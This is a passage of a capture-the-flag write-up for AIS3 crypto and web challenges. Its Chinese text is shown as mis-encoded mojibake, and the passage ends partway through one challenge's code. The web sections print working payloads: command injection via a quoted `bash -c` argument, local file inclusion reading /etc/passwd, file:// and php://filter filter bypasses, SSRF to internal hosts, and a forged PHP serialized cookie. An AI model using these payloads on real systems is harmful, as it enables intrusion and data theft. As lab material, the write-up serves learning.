<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">         !       @       #       $       %       &amp;</span><br><span class="line"></span><br><span class="line"> !       V       F       Y       J       6       1</span><br><span class="line"></span><br><span class="line"> @       5       0       M       2       9       L</span><br><span class="line"></span><br><span class="line"> #       I       W       H       S       4       Q</span><br><span class="line"></span><br><span class="line"> $       K       G       B       X       T       A</span><br><span class="line"></span><br><span class="line"> %       E       3       C       7       P       N</span><br><span class="line"></span><br><span class="line"> &amp;       U       Z       8       R       D       O</span><br><span class="line"></span><br><span class="line">&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $%  ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;#  &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;</span><br></pre></td></tr></table></figure>
<p>çµ¦äº†ä¸€å¼µè¡¨å’Œå¯†æ–‡ï¼Œå°è¡¨è½‰å›å»å°±å¥½äº†ï¼Œä½†è¦æ³¨æ„ row å’Œ column çš„é †åºï¼Œ<code>&amp;$</code> æ˜¯ A ä¸æ˜¯ Rã€‚</p>
<h3 id="Octopus"><a class="header-anchor" href="#Octopus"></a>Octopus</h3>
<p>é€™é¡Œçµ¦ python script å’Œä»–åŸ·è¡Œå¾Œçš„ outputï¼Œè£¡é¢åœ¨åš <a href="https://en.wikipedia.org/wiki/Quantum_key_distribution#BB84_protocol:_Charles_H._Bennett_and_Gilles_Brassard_(1984)">BB84 é‡å­å¯†é‘°åˆ†ç™¼</a>ï¼Œå…©é‚Šçš„ Basis éƒ½çµ¦äº†ï¼ŒQubits ä¹Ÿçµ¦äº†ï¼Œå°±æ˜¯æŠŠ Basis ä¸€æ¨£éƒ¨åˆ†çš„é‚£äº› Qubits æŠ“å‡ºä¾†è½‰å› binary å°±å¥½äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Blowfish"><a class="header-anchor" href="#Blowfish"></a>Blowfish</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 12001</code>ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œé‚„æœ‰ä¸€å€‹ python pickle dump çš„æª”æ¡ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&#39;name&#39;: &#39;maojui&#39;, &#39;password&#39;: &#39;SECRET&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;djosix&#39;, &#39;password&#39;: &#39;S3crE7&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;kaibro&#39;, &#39;password&#39;: &#39;GGInIn&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;others&#39;, &#39;password&#39;: &#39;_FLAG_&#39;, &#39;admin&#39;: False&#125;]</span><br></pre></td></tr></table></figure>
<p>é€£ä¸Šå»ä¹‹å¾Œï¼Œä»–æœƒçµ¦ä½ é€™æ®µç”¨ Blowfish çš„ CTR Mode åŠ å¯†çš„çµæœç•¶ä½œ tokenï¼Œæ¥è‘—ä½ å°±å¯ä»¥å†æŠŠ token ä¸Ÿå›å»çµ¦ä»–è§£å¯†ï¼Œä»–æœƒçœ‹ä½ æ˜¯ä¸æ˜¯ adminï¼Œå› ç‚ºæ˜¯ CTR Mode æ‰€ä»¥å°±ç¿»ä¸€ä¸‹ bit å°±å¥½äº†ï¼ŒæŠŠé‚£å€‹ False çš„éƒ¨åˆ†ç¿»æˆ Trueï¼Œå°±é€™éº¼ç°¡å–®ã€‚<br>
è©³æƒ…å¯ä»¥åƒè€ƒ <a href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">é€™ä»½æŠ•å½±ç‰‡</a> Bit-Flipping Attack çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Camel"><a class="header-anchor" href="#Camel"></a>Camel</h3>
<p>é€™é¡Œçµ¦äº† sage scriptï¼Œè£¡é¢æœ‰ä¸€å€‹ Elliptic Curveï¼Œä¸¦çµ¦äº†ä¸Šé¢çš„ 9 å€‹é»ï¼Œflag å°±æ˜¯ Elliptic Curve çš„åƒæ•¸ï¼Œå› ç‚ºä»–çµ¦çš„é»çš„ x åº§æ¨™éƒ½æ˜¯ $p-1, p+1, p+2, â€¦$ï¼Œæ‰€ä»¥å¸¶é€² $y^2 = x^3 + a x + b$ å¼å­ mod p ä¹‹å¾Œ p å°±éƒ½ä¸è¦‹äº†</p>
<p>$$<br>
\begin{align}<br>
&amp;(p-1)^3 + a (p-1) + b = -1 - a + b \pmod{p} \\<br>
&amp;(p+1)^3 + a (p+1) + b = 1 + a + b \pmod{p}<br>
\end{align}<br>
$$</p>
<p>ä¸Šé¢å…©å¼ç›¸åŠ ä¹‹å¾Œå¯ä»¥å¾—åˆ° <code>2b</code>ï¼Œé‚„æœ‰å…¶ä»–å…©çµ„ <code>p+3</code>, <code>p-3</code>, <code>p+5</code>, <code>p-5</code> ä¹Ÿæ˜¯åŒæ¨£çš„æƒ…æ³ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ‹¿åˆ°ä¸‰çµ„ <code>2b + kp</code> é€™æ¨£å½¢å¼çš„æ±è¥¿ï¼ŒæŠŠä»–å€‘äº’æ¸›å»åš gcd å°±å¾—åˆ° <code>p</code> äº†ï¼Œæœ‰ <code>p</code> ä¹‹å¾Œå°±å¸¶å›å»å°±å¯ä»¥å¾—åˆ° <code>a, b</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Turtle"><a class="header-anchor" href="#Turtle"></a>Turtle</h3>
<p>é€™é¡Œå°±æ˜¯ Padding Oracle Attackï¼Œæˆ‘æŠŠä»¥å‰çš„ script æ‹¿å‡ºä¾†ç„¶å¾ŒæŠŠ oracle æ›æˆç”¨ requests å»æŠ“å°±å®Œæˆäº†ã€‚<br>
è©³æƒ…å¯ä»¥åƒè€ƒ <a href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">é€™ä»½æŠ•å½±ç‰‡</a> Padding Oracle Attack çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5l0w_4nd_5734dy_w1n5_7h3_r4c3.&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
<h3 id="Squirrel"><a class="header-anchor" href="#Squirrel"></a>Squirrel</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://squirrel.ais3.org/%EF%BC%8C%E6%89%93%E9%96%8B%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%B5%81%E9%87%8F%E6%9C%83%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E5%80%8B%E8%AB%8B%E6%B1%82%E6%98%AF">https://squirrel.ais3.org/ï¼Œæ‰“é–‹çœ‹ä¸€ä¸‹æµé‡æœƒçœ‹åˆ°æœ‰ä¸€å€‹è«‹æ±‚æ˜¯</a> <code>/api.php?get=/etc/passwd</code>ï¼Œçœ‹èµ·ä¾†æ˜¯ç›´æ¥çµ¦ä½  local file inclusionï¼ŒæŠ“ä¸€ä¸‹ç¶²ç«™åŸå§‹ç¢¼ <code>/api.php?get=/var/www/html/api.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application\/json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">'get'</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">"cat '$file'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'output'</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'error'</span> =&gt; <span class="string">'cannot get file'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> json_encode([</span><br><span class="line">        <span class="string">'error'</span> =&gt; <span class="string">'empty file path'</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹èµ·ä¾†æ˜¯ command injectionï¼Œ<code>/api.php?get='|bash -c 'ls</code> å°±å¯ä»¥åŸ·è¡Œä»»æ„ command äº†ï¼Œ<code>ls /</code> çœ‹æ ¹ç›®éŒ„æœ‰å€‹ <code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code> è£¡é¢å°±æ˜¯ flag äº† ( å‰›å¥½æª”åè·Ÿ flag ä¸€æ¨£ï¼ŒçœŸä½›å¿ƒ )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shark"><a class="header-anchor" href="#Shark"></a>Shark</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://shark.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E5%80%8B%E9%80%A3%E7%B5%90%E9%BB%9E%E4%B8%8B%E5%8E%BB%E5%B0%B1%E6%98%AF">https://shark.ais3.org/ï¼Œé¦–é æœ‰å€‹é€£çµé»ä¸‹å»å°±æ˜¯</a> <code>/?path=hint.txt</code>ï¼Œåˆæ˜¯ local file inclusionï¼Œä½†æ˜¯ hint èªª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please find the other server in the internal network! (flag is on that server)</span><br><span class="line"></span><br><span class="line">    GET http:&#x2F;&#x2F;some-internal-server&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>é‚£å°±å…ˆçœ‹ä¸€ä¸‹åŸå§‹ç¢¼ <code>/?path=/var/www/html/index.php</code>ï¼Œç›´æ¥çœ‹æœƒæ‹¿åˆ° <code>[forbidden]</code>ï¼Œé‚£éš¨ä¾¿ç¹ä¸€ä¸‹ <code>/?path=file:///var/www/html/index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($path = @$_GET[<span class="string">'path'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(\.|\/)/'</span>, $path)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;[forbidden]&lt;/pre&gt;'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $content = @file_get_contents($path, <span class="keyword">FALSE</span>, <span class="keyword">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . ($content ? htmlentities($content) : <span class="string">'[empty]'</span>) . <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/h1&gt;</span><br><span class="line">    &lt;a href=<span class="string">"?path=hint.txt"</span>&gt;Shark never cries?&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>æœ‰ç”¨ regex æª¢æŸ¥é–‹é ­ä¸èƒ½æ˜¯ <code>.</code> å’Œ <code>/</code>ï¼Œæ‰€ä»¥ <code>file://</code> æˆ– <code>php://filter/read=convert.base64-encode/resource=</code> éƒ½å¯ä»¥ç¹ï¼Œå†ä¾†çœ‹ <code>/?path=file:///etc/hosts</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.22.0.3	02b23467485e</span><br></pre></td></tr></table></figure>
<p>ç€è¦½ä¸€ä¸‹ <code>/?path=http://02b23467485e</code> ç™¼ç¾æ˜¯æœ¬æ©Ÿï¼Œé‚£å°±æ‰¾æ‰¾å­ç¶²è·¯ä¸‹çš„é„°å±…å€‘ï¼Œå°±æ‰¾åˆ° <code>/?path=http://172.22.0.2/flag</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Elephant"><a class="header-anchor" href="#Elephant"></a>Elephant</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://elephant.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%85%A5%EF%BC%8C%E9%9A%A8%E4%BE%BF%E8%BC%B8%E5%85%A5%E5%80%8B">https://elephant.ais3.org/ï¼Œé¦–é å¯ä»¥ç™»å…¥ï¼Œéš¨ä¾¿è¼¸å…¥å€‹</a> username å°±ç™»å…¥äº†ä¸éœ€è¦å¯†ç¢¼ï¼Œç¬¬ä¸€æ­¥ç•¶ç„¶æ˜¯æ‰¾æ‰¾æœ‰æ²’æœ‰åŸå§‹ç¢¼ï¼Œçœ‹äº†ä¸€ä¸‹ <code>robots.txt</code> æ²’æ±è¥¿ï¼Œå†çœ‹ <code>.git</code> æ˜¯ Forbiddenï¼Œä¸­çï¼Œéš¨ä¾¿æ‰¾å€‹ GitDumper æŠŠ <code>.git</code> æŠ“ä¸‹ä¾†ï¼Œ<code>git log</code> çœ‹åˆ°å‰ä¸€å€‹ commit æŠŠåŸå§‹ç¢¼åˆªæ‰äº†ï¼Œ<code>git reset --hard</code> å›å»ï¼ŒåŸå§‹ç¢¼å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSION = <span class="string">'elephant_user'</span>;</span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp($flag, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: /'</span>);</span><br><span class="line">    setcookie(SESSION, <span class="keyword">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($name = $_POST[<span class="string">'name'</span>]) &#123;</span><br><span class="line">    $user = <span class="keyword">new</span> User($name);</span><br><span class="line">    header(<span class="string">'Location: /'</span>);</span><br><span class="line">    setcookie(SESSION, base64_encode(serialize($user)), time() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($data = @$_COOKIE[SESSION]) &#123;</span><br><span class="line">    $user = unserialize(base64_decode($data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Elephant&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">'utf-8'</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> id=<span class="string">"bootstrap-css"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!$user): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">"login"</span>&gt;</span><br><span class="line">            &lt;h3 class="text-center text-white pt-5"&gt;Are you familiar with PHP?&lt;/h3&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;div id="login-row" class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                    &lt;div id="login-column" class="col-md-6"&gt;</span><br><span class="line">                        &lt;div id="login-box" class="col-md-12"&gt;</span><br><span class="line">                            &lt;form id="login-form" class="form" action="" method="post"&gt;</span><br><span class="line">                                &lt;h3 class="text-center text-info"&gt;What's your name!?&lt;/h3&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Name:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="name" id="name" class="form-control"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;input type="submit" name="submit" class="btn btn-info btn-md" value="let me in"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">        &lt;h3 class="text-center text-white pt-5"&gt;You may want to read the source code.&lt;/h3&gt;</span><br><span class="line">        &lt;div class="container" style="text-align: center"&gt;</span><br><span class="line">            &lt;img src=<span class="string">"images/elephant2.png"</span>&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                &lt;div class="col-md-6"&gt;</span><br><span class="line">                    &lt;div class="col-md-12"&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;Do you know?&lt;/h3&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;PHP's mascot is an elephant!&lt;/h3&gt;</span><br><span class="line">                        Hello, &lt;b&gt;<span class="meta">&lt;?</span>= $user-&gt;name <span class="meta">?&gt;</span>&lt;/b&gt;!</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user-&gt;canReadFlag()): <span class="meta">?&gt;</span></span><br><span class="line">                            This is your flag: &lt;b&gt;<span class="meta">&lt;?</span>= $flag <span class="meta">?&gt;</span>&lt;/b&gt;</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">                            Your token is not sufficient to read the flag!</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;a href=<span class="string">"?logout"</span>&gt;Logout!&lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>åªè¦è®“ <code>strcmp($flag, $this-&gt;token) == 0</code> å°±å¥½å•¦ï¼Œé‚£ <code>strcmp</code> å·²çŸ¥çš„å•é¡Œå°±æ˜¯ä»– compare é™£åˆ—éš¨ç„¶æœƒå™´ Warningï¼Œä½†çµæœæœƒæ˜¯ <code>NULL</code>ï¼Œè€Œé€™è£¡æ˜¯ç”¨å…©å€‹ <code>=</code> ä¸æ˜¯ä¸‰å€‹ï¼Œæ‰€ä»¥ <code>NULL == 0</code>ï¼ŒæŠŠä¸‹é¢é€™æ®µ base64 encode å¾Œæ”¾å› Cookie å°±å®Œæˆå•¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\x00User\x00token&quot;;a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Snake"><a class="header-anchor" href="#Snake"></a>Snake</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://snake.ais3.org/">https://snake.ais3.org/</a> ï¼Œé¦–é å°±æ˜¯åŸå§‹ç¢¼äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">'text/plain'</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span 